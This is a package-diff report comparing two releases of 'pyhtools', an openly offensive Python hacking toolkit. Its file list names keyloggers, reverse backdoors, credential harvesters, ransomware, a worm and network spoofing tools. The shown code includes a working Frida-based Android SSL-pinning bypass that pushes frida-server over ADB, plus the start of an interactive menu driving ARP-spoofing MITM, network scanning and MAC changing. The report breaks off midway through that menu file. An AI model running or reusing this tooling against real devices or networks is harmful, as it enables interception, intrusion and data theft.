# Comparing `tmp/pyhtools-2.2.1.tar.gz` & `tmp/pyhtools-2.2.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "pyhtools-2.2.1.tar", max compression
+gzip compressed data, was "pyhtools-2.2.2.tar", max compression
```

## Comparing `pyhtools-2.2.1.tar` & `pyhtools-2.2.2.tar`

### file list

```diff
@@ -1,72 +1,72 @@
--rw-r--r--   0        0        0     1092 2023-04-25 17:42:54.251011 pyhtools-2.2.1/LICENSE
--rw-r--r--   0        0        0        0 2023-04-25 18:13:37.104832 pyhtools-2.2.1/pyhtools/__init__.py
--rw-r--r--   0        0        0      137 2023-04-29 09:33:06.558539 pyhtools-2.2.1/pyhtools/__main__.py
--rw-r--r--   0        0        0        0 2023-04-25 17:42:54.266562 pyhtools-2.2.1/pyhtools/attackers/__init__.py
--rw-r--r--   0        0        0        0 2023-04-25 17:42:54.261981 pyhtools-2.2.1/pyhtools/attackers/Android/__init__.py
--rw-r--r--   0        0        0     2815 2023-04-25 17:42:54.261981 pyhtools-2.2.1/pyhtools/attackers/Android/forensics/data_harvestor.py
--rw-r--r--   0        0        0        0 2023-04-25 17:42:54.261981 pyhtools-2.2.1/pyhtools/attackers/Android/mitm/__init__.py
--rw-r--r--   0        0        0     5037 2023-04-25 17:42:54.262980 pyhtools-2.2.1/pyhtools/attackers/Android/mitm/cert_pin.py
--rw-r--r--   0        0        0      422 2023-04-25 17:42:54.262980 pyhtools-2.2.1/pyhtools/attackers/Android/mitm/utils.py
--rw-r--r--   0        0        0     4820 2023-04-29 09:55:07.229175 pyhtools-2.2.1/pyhtools/attackers/attackers.py
--rw-r--r--   0        0        0        0 2023-04-25 17:42:54.262980 pyhtools-2.2.1/pyhtools/attackers/Network/__init__.py
--rw-r--r--   0        0        0     5151 2023-04-25 17:42:54.263977 pyhtools-2.2.1/pyhtools/attackers/Network/arpspoofer.py
--rw-r--r--   0        0        0     4404 2023-04-25 17:42:54.263977 pyhtools-2.2.1/pyhtools/attackers/Network/code_injector.py
--rw-r--r--   0        0        0     3591 2023-04-25 17:42:54.263977 pyhtools-2.2.1/pyhtools/attackers/Network/dnsspoofer.py
--rw-r--r--   0        0        0     4730 2023-04-25 17:42:54.263977 pyhtools-2.2.1/pyhtools/attackers/Network/downloads_replacer.py
--rw-r--r--   0        0        0     3921 2023-04-25 17:42:54.264974 pyhtools-2.2.1/pyhtools/attackers/Network/machngr.py
--rw-r--r--   0        0        0     2290 2023-04-25 17:42:54.265563 pyhtools-2.2.1/pyhtools/attackers/Network/network_jammer.py
--rw-r--r--   0        0        0     2068 2023-04-25 17:42:54.265563 pyhtools-2.2.1/pyhtools/attackers/Network/nwscan.py
--rw-r--r--   0        0        0     2680 2023-04-25 17:42:54.265563 pyhtools-2.2.1/pyhtools/attackers/Network/pkt_sniffer.py
--rw-r--r--   0        0        0     5501 2023-04-25 17:42:54.265563 pyhtools-2.2.1/pyhtools/attackers/Network/tcp_proxy.py
--rw-r--r--   0        0        0        0 2023-04-25 17:42:54.266562 pyhtools-2.2.1/pyhtools/attackers/web/__init__.py
--rw-r--r--   0        0        0        0 2023-04-25 17:42:54.266562 pyhtools-2.2.1/pyhtools/attackers/web/api/__init__.py
--rw-r--r--   0        0        0     5177 2023-04-25 17:42:54.267559 pyhtools-2.2.1/pyhtools/attackers/web/api/discover.py
--rw-r--r--   0        0        0     2280 2023-04-29 09:41:26.943813 pyhtools-2.2.1/pyhtools/attackers/web/enumerate.py
--rw-r--r--   0        0        0     1984 2023-04-25 17:42:54.267559 pyhtools-2.2.1/pyhtools/attackers/web/get_forms.py
--rw-r--r--   0        0        0     1123 2023-04-25 17:42:54.268556 pyhtools-2.2.1/pyhtools/attackers/web/login_guesser.py
--rw-r--r--   0        0        0     2843 2023-04-25 17:42:54.268556 pyhtools-2.2.1/pyhtools/attackers/web/spider.py
--rw-r--r--   0        0        0     3279 2023-04-25 17:42:54.269299 pyhtools-2.2.1/pyhtools/attackers/web/utils.py
--rw-r--r--   0        0        0        0 2023-04-25 17:42:54.269299 pyhtools-2.2.1/pyhtools/attackers/web/vuln_scanner/__init__.py
--rw-r--r--   0        0        0     6440 2023-04-25 17:42:54.269299 pyhtools-2.2.1/pyhtools/attackers/web/vuln_scanner/scanner.py
--rw-r--r--   0        0        0     2174 2023-04-25 17:42:54.270298 pyhtools-2.2.1/pyhtools/attackers/web/vuln_scanner/sqli.py
--rw-r--r--   0        0        0     2888 2023-04-25 17:42:54.270298 pyhtools-2.2.1/pyhtools/attackers/web/vuln_scanner/vuln_scanner.py
--rw-r--r--   0        0        0        0 2023-04-25 17:42:54.270298 pyhtools-2.2.1/pyhtools/detectors/__init__.py
--rw-r--r--   0        0        0     1737 2023-04-25 17:42:54.270298 pyhtools-2.2.1/pyhtools/detectors/arp_spoof_detector.py
--rw-r--r--   0        0        0     2139 2023-04-29 13:02:00.887409 pyhtools-2.2.1/pyhtools/evil_files/exec_generator.py
--rw-r--r--   0        0        0        0 2023-04-25 17:42:54.271295 pyhtools-2.2.1/pyhtools/evil_files/malwares/__init__.py
--rw-r--r--   0        0        0     3454 2023-04-25 17:42:54.272293 pyhtools-2.2.1/pyhtools/evil_files/malwares/backdoor/ssh/backdoor.py
--rw-r--r--   0        0        0     2347 2023-04-25 17:42:54.272293 pyhtools-2.2.1/pyhtools/evil_files/malwares/backdoor/ssh/handler.py
--rw-r--r--   0        0        0     1908 2023-04-25 17:42:54.272293 pyhtools-2.2.1/pyhtools/evil_files/malwares/data_harvesters/credential_harvester.py
--rw-r--r--   0        0        0     1681 2023-04-25 17:42:54.273290 pyhtools-2.2.1/pyhtools/evil_files/malwares/data_harvesters/ssh_cred_harvester.py
--rw-r--r--   0        0        0     5013 2023-04-25 17:42:54.273290 pyhtools-2.2.1/pyhtools/evil_files/malwares/data_harvesters/telegram_data_harvester.py
--rw-r--r--   0        0        0     2295 2023-04-25 17:42:54.273290 pyhtools-2.2.1/pyhtools/evil_files/malwares/data_harvesters/wireless_password_harvester.py
--rw-r--r--   0        0        0        0 2023-04-25 17:42:54.273290 pyhtools-2.2.1/pyhtools/evil_files/malwares/installer/__init__.py
--rw-r--r--   0        0        0     1619 2023-04-25 17:42:54.274287 pyhtools-2.2.1/pyhtools/evil_files/malwares/installer/cert.py
--rw-r--r--   0        0        0        0 2023-04-25 17:42:54.274287 pyhtools-2.2.1/pyhtools/evil_files/malwares/keylogger/__init__.py
--rw-r--r--   0        0        0     2700 2023-04-25 17:42:54.274287 pyhtools-2.2.1/pyhtools/evil_files/malwares/keylogger/keylogger.py
--rw-r--r--   0        0        0        0 2023-04-25 17:42:54.276282 pyhtools-2.2.1/pyhtools/evil_files/malwares/reverse_backdoor/__init__.py
--rw-r--r--   0        0        0        0 2023-04-25 17:42:54.275285 pyhtools-2.2.1/pyhtools/evil_files/malwares/reverse_backdoor/HTTP/__init__.py
--rw-r--r--   0        0        0     1387 2023-04-25 17:42:54.275285 pyhtools-2.2.1/pyhtools/evil_files/malwares/reverse_backdoor/HTTP/backdoor.py
--rw-r--r--   0        0        0     1189 2023-04-25 17:42:54.275285 pyhtools-2.2.1/pyhtools/evil_files/malwares/reverse_backdoor/HTTP/listener.py
--rw-r--r--   0        0        0        0 2023-04-25 17:42:54.277282 pyhtools-2.2.1/pyhtools/evil_files/malwares/reverse_backdoor/ssh/__init__.py
--rw-r--r--   0        0        0     5175 2023-04-25 17:42:54.277282 pyhtools-2.2.1/pyhtools/evil_files/malwares/reverse_backdoor/ssh/backdoor.py
--rw-r--r--   0        0        0        0 2023-04-25 17:42:54.275285 pyhtools-2.2.1/pyhtools/evil_files/malwares/reverse_backdoor/TCP/__init__.py
--rw-r--r--   0        0        0     5408 2023-04-25 17:42:54.276282 pyhtools-2.2.1/pyhtools/evil_files/malwares/reverse_backdoor/TCP/listener.py
--rw-r--r--   0        0        0     5939 2023-04-25 17:42:54.276282 pyhtools-2.2.1/pyhtools/evil_files/malwares/reverse_backdoor/TCP/reverse_backdoor.py
--rw-r--r--   0        0        0        0 2023-04-25 17:42:54.278284 pyhtools-2.2.1/pyhtools/evil_files/malwares/telegram_remote_code_executor/__init__.py
--rw-r--r--   0        0        0     4503 2023-04-25 17:42:54.278284 pyhtools-2.2.1/pyhtools/evil_files/malwares/telegram_remote_code_executor/TelegramRemoteCodeExecutor.py
--rw-r--r--   0        0        0     2681 2023-04-25 17:42:54.278284 pyhtools-2.2.1/pyhtools/evil_files/malwares/utils.py
--rw-r--r--   0        0        0        0 2023-04-25 17:42:54.279274 pyhtools-2.2.1/pyhtools/evil_files/ransomwares/__init__.py
--rw-r--r--   0        0        0        0 2023-04-25 17:42:54.279274 pyhtools-2.2.1/pyhtools/evil_files/ransomwares/dmsec/__init__.py
--rw-r--r--   0        0        0     2203 2023-04-25 17:42:54.279274 pyhtools-2.2.1/pyhtools/evil_files/ransomwares/dmsec/decrypter.py
--rw-r--r--   0        0        0     2306 2023-04-25 17:42:54.280272 pyhtools-2.2.1/pyhtools/evil_files/ransomwares/dmsec/encrypter.py
--rw-r--r--   0        0        0     1105 2023-04-25 17:42:54.279274 pyhtools-2.2.1/pyhtools/evil_files/ransomwares/dmsec/HowToUse.md
--rw-r--r--   0        0        0        0 2023-04-25 17:42:54.280272 pyhtools-2.2.1/pyhtools/evil_files/worms/__init__.py
--rw-r--r--   0        0        0     3993 2023-04-25 17:42:54.280272 pyhtools-2.2.1/pyhtools/evil_files/worms/dir_cloner.py
--rw-r--r--   0        0        0        0 2023-04-25 17:42:54.259994 pyhtools-2.2.1/pyhtools/UI/__init__.py
--rw-r--r--   0        0        0      292 2023-04-25 17:42:54.260985 pyhtools-2.2.1/pyhtools/UI/colors.py
--rw-r--r--   0        0        0     5812 2023-04-29 09:55:07.228177 pyhtools-2.2.1/pyhtools/UI/functions.py
--rw-r--r--   0        0        0      549 2023-04-25 17:42:54.281464 pyhtools-2.2.1/pyhtools/utils.py
--rw-r--r--   0        0        0     1570 2023-04-29 13:02:00.887409 pyhtools-2.2.1/pyproject.toml
--rw-r--r--   0        0        0     7022 2023-04-29 13:02:00.886433 pyhtools-2.2.1/README.md
--rw-r--r--   0        0        0     8813 1970-01-01 00:00:00.000000 pyhtools-2.2.1/PKG-INFO
+-rw-r--r--   0        0        0     1071 2023-04-29 18:57:51.844475 pyhtools-2.2.2/LICENSE
+-rw-r--r--   0        0        0     6823 2023-04-29 18:57:51.848475 pyhtools-2.2.2/README.md
+-rw-r--r--   0        0        0        0 2023-04-29 18:57:51.852475 pyhtools-2.2.2/pyhtools/UI/__init__.py
+-rw-r--r--   0        0        0      283 2023-04-29 18:57:51.852475 pyhtools-2.2.2/pyhtools/UI/colors.py
+-rw-r--r--   0        0        0     5616 2023-04-29 18:57:51.852475 pyhtools-2.2.2/pyhtools/UI/functions.py
+-rw-r--r--   0        0        0        0 2023-04-29 18:57:51.852475 pyhtools-2.2.2/pyhtools/__init__.py
+-rw-r--r--   0        0        0      162 2023-04-29 19:22:01.890916 pyhtools-2.2.2/pyhtools/__main__.py
+-rw-r--r--   0        0        0        0 2023-04-29 18:57:51.852475 pyhtools-2.2.2/pyhtools/attackers/Android/__init__.py
+-rw-r--r--   0        0        0     2728 2023-04-29 18:57:51.852475 pyhtools-2.2.2/pyhtools/attackers/Android/forensics/data_harvestor.py
+-rw-r--r--   0        0        0        0 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Android/mitm/__init__.py
+-rw-r--r--   0        0        0     4887 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Android/mitm/cert_pin.py
+-rw-r--r--   0        0        0      406 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Android/mitm/utils.py
+-rw-r--r--   0        0        0        0 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Network/__init__.py
+-rw-r--r--   0        0        0     4981 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Network/arpspoofer.py
+-rw-r--r--   0        0        0     4272 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Network/code_injector.py
+-rw-r--r--   0        0        0     3479 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Network/dnsspoofer.py
+-rw-r--r--   0        0        0     4584 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Network/downloads_replacer.py
+-rw-r--r--   0        0        0     3802 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Network/machngr.py
+-rw-r--r--   0        0        0     2215 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Network/network_jammer.py
+-rw-r--r--   0        0        0     1996 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Network/nwscan.py
+-rw-r--r--   0        0        0     2579 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Network/pkt_sniffer.py
+-rw-r--r--   0        0        0     5348 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Network/tcp_proxy.py
+-rw-r--r--   0        0        0        0 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/__init__.py
+-rw-r--r--   0        0        0     4669 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/attackers.py
+-rw-r--r--   0        0        0        0 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/web/__init__.py
+-rw-r--r--   0        0        0        0 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/web/api/__init__.py
+-rw-r--r--   0        0        0     5035 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/web/api/discover.py
+-rw-r--r--   0        0        0     2212 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/web/enumerate.py
+-rw-r--r--   0        0        0     1918 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/web/get_forms.py
+-rw-r--r--   0        0        0     1096 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/web/login_guesser.py
+-rw-r--r--   0        0        0     2755 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/web/spider.py
+-rw-r--r--   0        0        0     3188 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/web/utils.py
+-rw-r--r--   0        0        0        0 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/attackers/web/vuln_scanner/__init__.py
+-rw-r--r--   0        0        0     6262 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/attackers/web/vuln_scanner/scanner.py
+-rw-r--r--   0        0        0     2092 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/attackers/web/vuln_scanner/sqli.py
+-rw-r--r--   0        0        0     2810 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/attackers/web/vuln_scanner/vuln_scanner.py
+-rw-r--r--   0        0        0        0 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/detectors/__init__.py
+-rw-r--r--   0        0        0     1681 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/detectors/arp_spoof_detector.py
+-rw-r--r--   0        0        0     2061 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/exec_generator.py
+-rw-r--r--   0        0        0        0 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/__init__.py
+-rw-r--r--   0        0        0     3352 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/backdoor/ssh/backdoor.py
+-rw-r--r--   0        0        0     2272 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/backdoor/ssh/handler.py
+-rw-r--r--   0        0        0     1850 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/data_harvesters/credential_harvester.py
+-rw-r--r--   0        0        0     1632 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/data_harvesters/ssh_cred_harvester.py
+-rw-r--r--   0        0        0     4868 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/data_harvesters/telegram_data_harvester.py
+-rw-r--r--   0        0        0     2230 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/data_harvesters/wireless_password_harvester.py
+-rw-r--r--   0        0        0        0 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/installer/__init__.py
+-rw-r--r--   0        0        0     1566 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/installer/cert.py
+-rw-r--r--   0        0        0        0 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/keylogger/__init__.py
+-rw-r--r--   0        0        0     2599 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/keylogger/keylogger.py
+-rw-r--r--   0        0        0        0 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/HTTP/__init__.py
+-rw-r--r--   0        0        0     1338 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/HTTP/backdoor.py
+-rw-r--r--   0        0        0     1147 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/HTTP/listener.py
+-rw-r--r--   0        0        0        0 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/TCP/__init__.py
+-rw-r--r--   0        0        0     5247 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/TCP/listener.py
+-rw-r--r--   0        0        0     5727 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/TCP/reverse_backdoor.py
+-rw-r--r--   0        0        0        0 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/__init__.py
+-rw-r--r--   0        0        0        0 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/ssh/__init__.py
+-rw-r--r--   0        0        0     5015 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/ssh/backdoor.py
+-rw-r--r--   0        0        0     4349 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/malwares/telegram_remote_code_executor/TelegramRemoteCodeExecutor.py
+-rw-r--r--   0        0        0        0 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/malwares/telegram_remote_code_executor/__init__.py
+-rw-r--r--   0        0        0     2589 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/malwares/utils.py
+-rw-r--r--   0        0        0        0 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/ransomwares/__init__.py
+-rw-r--r--   0        0        0     1074 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/ransomwares/dmsec/HowToUse.md
+-rw-r--r--   0        0        0        0 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/ransomwares/dmsec/__init__.py
+-rw-r--r--   0        0        0     2130 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/ransomwares/dmsec/decrypter.py
+-rw-r--r--   0        0        0     2242 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/ransomwares/dmsec/encrypter.py
+-rw-r--r--   0        0        0        0 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/worms/__init__.py
+-rw-r--r--   0        0        0     3857 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/worms/dir_cloner.py
+-rw-r--r--   0        0        0      528 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/utils.py
+-rw-r--r--   0        0        0     1585 2023-04-29 19:22:01.894916 pyhtools-2.2.2/pyproject.toml
+-rw-r--r--   0        0        0     8813 1970-01-01 00:00:00.000000 pyhtools-2.2.2/PKG-INFO
```

### Comparing `pyhtools-2.2.1/pyhtools/attackers/Android/mitm/cert_pin.py` & `pyhtools-2.2.2/pyhtools/attackers/Android/mitm/cert_pin.py`

 * *Ordering differences only*

 * *Files 14% similar despite different names*

```diff
@@ -1,150 +1,150 @@
-from ppadb.client import Client
-from ppadb.device import Device
-from os.path import isfile, basename
-from os import system
-from . import utils
-
-import asyncio
-import frida
-import logging
-import threading
-logging.basicConfig(level=logging.DEBUG,
-                    format='[%(asctime)s] [%(levelname)s] - %(message)s')
-
-
-class PinCertificateExceptions:
-    '''
-    Pin Certificate Exception Class
-    '''
-    class ServerNotRunning(Exception):
-        pass
-
-    class NoDevicesFound(Exception):
-        pass
-
-
-class PinCertificate:
-    def __init__(self, apk_path: str,  package_name: str, cert_path: str, frida_binary_path: str, frida_script_path: str, device_name: str, host: str = '127.0.0.1', port: int = 5037,):
-        # check data types
-        assert type(apk_path) == str
-        assert type(package_name) == str
-        assert type(cert_path) == str
-        assert type(device_name) == str
-        assert type(frida_binary_path) == str
-        assert type(frida_script_path) == str
-        assert type(host) == str
-        assert type(port) == int
-
-        # check if files are available at their paths
-        if not isfile(apk_path):
-            raise FileNotFoundError(f'{apk_path} APK file not found')
-
-        if not isfile(cert_path):
-            raise FileNotFoundError(f'{cert_path} Certificate file not found')
-
-        if not isfile(frida_binary_path):
-            raise FileNotFoundError(
-                f'{frida_binary_path} Frida binary file not found')
-
-        if not isfile(frida_script_path):
-            raise FileNotFoundError(
-                f'{frida_binary_path} Frida binary file not found')
-
-        # assign values
-        self.__device_name = device_name
-        self.__apk_path = apk_path
-        self.__package_name = package_name
-        self.__cert_path = cert_path
-        self.__frida_path = frida_binary_path
-        self.__frida_script_path = frida_script_path
-
-        # connect to adb server
-        self._adb = Client(
-            host=host,
-            port=port
-        )
-
-        # set initial values
-        self.device = self.get_device()
-
-    def get_device(self):
-        _ = self.get_adb_devices()
-        device: Device = self._adb.device(self.__device_name)
-        return device
-
-    def get_adb_devices(self):
-        try:
-            devices: list[Device] = self._adb.devices()
-            if len(devices) == 0:
-                raise PinCertificateExceptions.NoDevicesFound(
-                    "No ADB Devices Attached")
-
-            return devices
-        except RuntimeError:
-            raise PinCertificateExceptions.ServerNotRunning(
-                "ADB Server is not running, start using `adb start-server`")
-
-    def get_frida_devices(self):
-        devices = frida.enumerate_devices()
-        if len(devices) == 0:
-            raise PinCertificateExceptions.NoDevicesFound(
-                "No Frida Devices Found")
-
-        return devices
-
-    def install_apk(self, force_install: bool = True):
-        if self.device.is_installed(self.__package_name) and force_install:
-            self.device.uninstall(self.__package_name)
-
-        self.device.install(self.__apk_path)
-
-        if self.device.is_installed(self.__package_name):
-            return True
-        return False
-
-    def start_frida(self):
-        asyncio.run(utils.run(f'adb shell /data/local/tmp/frida-server &'))
-
-    def pin_certificate(self):
-        logging.info("Starting Certificate Pinning Procedure..")
-
-        # get device
-        self.device: Device = self.get_device()
-        logging.info(f'Connected to {self.__device_name} device')
-
-        # install apk
-        logging.info(f'Installing package')
-        if self.install_apk():
-            logging.info(
-                f'{basename(self.__apk_path)} APK installation completed successfully')
-        else:
-            logging.error(
-                f'{basename(self.__apk_path)} APK installation failed!')
-
-        # push certificate to the device
-        self.device.push(
-            src=self.__cert_path,
-            dest=r'/data/local/tmp/cert-der.crt',
-            mode=644
-        )
-        logging.info(
-            f'{self.__cert_path} certificate pushed to /data/local/tmp/cert-der.crt')
-
-        # push frida binary to the device
-        self.device.push(
-            src=self.__frida_path,
-            dest=r'/data/local/tmp/frida-server',
-            mode=555
-        )
-        logging.info(
-            f'{self.__frida_path} frida binary pushed to /data/local/tmp/frida-server')
-
-        # start frida server in different thread
-        logging.info("Starting Frida server")
-        frida_thread = threading.Thread(target=self.start_frida)
-        frida_thread.start()
-        # self.device.shell('su /data/local/tmp/frida-server &')
-
-        # Start SSL pinning
-        system(
-            f'frida -U -l {self.__frida_script_path} --no-paus -f {self.__package_name}')
+from ppadb.client import Client
+from ppadb.device import Device
+from os.path import isfile, basename
+from os import system
+from . import utils
+
+import asyncio
+import frida
+import logging
+import threading
+logging.basicConfig(level=logging.DEBUG,
+                    format='[%(asctime)s] [%(levelname)s] - %(message)s')
+
+
+class PinCertificateExceptions:
+    '''
+    Pin Certificate Exception Class
+    '''
+    class ServerNotRunning(Exception):
+        pass
+
+    class NoDevicesFound(Exception):
+        pass
+
+
+class PinCertificate:
+    def __init__(self, apk_path: str,  package_name: str, cert_path: str, frida_binary_path: str, frida_script_path: str, device_name: str, host: str = '127.0.0.1', port: int = 5037,):
+        # check data types
+        assert type(apk_path) == str
+        assert type(package_name) == str
+        assert type(cert_path) == str
+        assert type(device_name) == str
+        assert type(frida_binary_path) == str
+        assert type(frida_script_path) == str
+        assert type(host) == str
+        assert type(port) == int
+
+        # check if files are available at their paths
+        if not isfile(apk_path):
+            raise FileNotFoundError(f'{apk_path} APK file not found')
+
+        if not isfile(cert_path):
+            raise FileNotFoundError(f'{cert_path} Certificate file not found')
+
+        if not isfile(frida_binary_path):
+            raise FileNotFoundError(
+                f'{frida_binary_path} Frida binary file not found')
+
+        if not isfile(frida_script_path):
+            raise FileNotFoundError(
+                f'{frida_binary_path} Frida binary file not found')
+
+        # assign values
+        self.__device_name = device_name
+        self.__apk_path = apk_path
+        self.__package_name = package_name
+        self.__cert_path = cert_path
+        self.__frida_path = frida_binary_path
+        self.__frida_script_path = frida_script_path
+
+        # connect to adb server
+        self._adb = Client(
+            host=host,
+            port=port
+        )
+
+        # set initial values
+        self.device = self.get_device()
+
+    def get_device(self):
+        _ = self.get_adb_devices()
+        device: Device = self._adb.device(self.__device_name)
+        return device
+
+    def get_adb_devices(self):
+        try:
+            devices: list[Device] = self._adb.devices()
+            if len(devices) == 0:
+                raise PinCertificateExceptions.NoDevicesFound(
+                    "No ADB Devices Attached")
+
+            return devices
+        except RuntimeError:
+            raise PinCertificateExceptions.ServerNotRunning(
+                "ADB Server is not running, start using `adb start-server`")
+
+    def get_frida_devices(self):
+        devices = frida.enumerate_devices()
+        if len(devices) == 0:
+            raise PinCertificateExceptions.NoDevicesFound(
+                "No Frida Devices Found")
+
+        return devices
+
+    def install_apk(self, force_install: bool = True):
+        if self.device.is_installed(self.__package_name) and force_install:
+            self.device.uninstall(self.__package_name)
+
+        self.device.install(self.__apk_path)
+
+        if self.device.is_installed(self.__package_name):
+            return True
+        return False
+
+    def start_frida(self):
+        asyncio.run(utils.run(f'adb shell /data/local/tmp/frida-server &'))
+
+    def pin_certificate(self):
+        logging.info("Starting Certificate Pinning Procedure..")
+
+        # get device
+        self.device: Device = self.get_device()
+        logging.info(f'Connected to {self.__device_name} device')
+
+        # install apk
+        logging.info(f'Installing package')
+        if self.install_apk():
+            logging.info(
+                f'{basename(self.__apk_path)} APK installation completed successfully')
+        else:
+            logging.error(
+                f'{basename(self.__apk_path)} APK installation failed!')
+
+        # push certificate to the device
+        self.device.push(
+            src=self.__cert_path,
+            dest=r'/data/local/tmp/cert-der.crt',
+            mode=644
+        )
+        logging.info(
+            f'{self.__cert_path} certificate pushed to /data/local/tmp/cert-der.crt')
+
+        # push frida binary to the device
+        self.device.push(
+            src=self.__frida_path,
+            dest=r'/data/local/tmp/frida-server',
+            mode=555
+        )
+        logging.info(
+            f'{self.__frida_path} frida binary pushed to /data/local/tmp/frida-server')
+
+        # start frida server in different thread
+        logging.info("Starting Frida server")
+        frida_thread = threading.Thread(target=self.start_frida)
+        frida_thread.start()
+        # self.device.shell('su /data/local/tmp/frida-server &')
+
+        # Start SSL pinning
+        system(
+            f'frida -U -l {self.__frida_script_path} --no-paus -f {self.__package_name}')
```

### Comparing `pyhtools-2.2.1/pyhtools/attackers/attackers.py` & `pyhtools-2.2.2/pyhtools/attackers/attackers.py`

 * *Ordering differences only*

 * *Files 19% similar despite different names*

```diff
@@ -1,151 +1,151 @@
-from asyncio import run
-from pyhtools.UI.colors import BRIGHT_YELLOW, BRIGHT_WHITE
-from pyhtools.attackers.web.vuln_scanner.scanner import Scanner
-from pyhtools.attackers.web.spider import Spider
-from pyhtools.attackers.web.enumerate import Discoverer
-
-
-import json
-import pyhtools.attackers.Network.arpspoofer as arp
-import pyhtools.attackers.Network.nwscan as nwscan
-import pyhtools.attackers.Network.machngr as machngr
-import pyhtools.attackers.web.login_guesser as web_login
-
-
-# Use args/kwargs to rate limit requests
-discoverer = Discoverer()
-
-# NETWORK ATTACKS
-# TODO: Create functions for Network Attackers : codeinjector, dnsspoofer, download replacer, packet_sniffer.
-def arpspoofer():
-    '''
-    description: perform arp poisoning attack.
-    params: None
-    returns: None
-    '''
-    target_ip = input('[+] TARGET IP : ')
-    spoof_ip = input('[+] SPOOF IP : ')
-    perform_mitm = input('[+] Perform MITM attack (y/n)(default=y): ').lower()
-    if perform_mitm == 'n':
-        perform_mitm = False
-    else:
-        perform_mitm = True
-    arp.run_spoofer(target_ip, spoof_ip, perform_mitm)
-
-
-def nw_scan():
-    '''
-    description: perform network scan.
-    params: None
-    returns: None
-    '''
-    ip_range = input('[+] IP (192.168.10.1/24): ')
-    nwscan.run_nwscan(ip_range)
-
-
-def mac_changer():
-    '''
-    description: changes mac of network interface.
-    params: None
-    returns: None
-    '''
-    interface = input('[+] Interface : ')
-    print(BRIGHT_YELLOW +
-          '[!] To generate random mac enter "random" (without quotes)')
-    new_mac = input('[+] New Mac : ')
-    if new_mac == 'random':
-        print(BRIGHT_WHITE + '[*] Generating Random Mac')
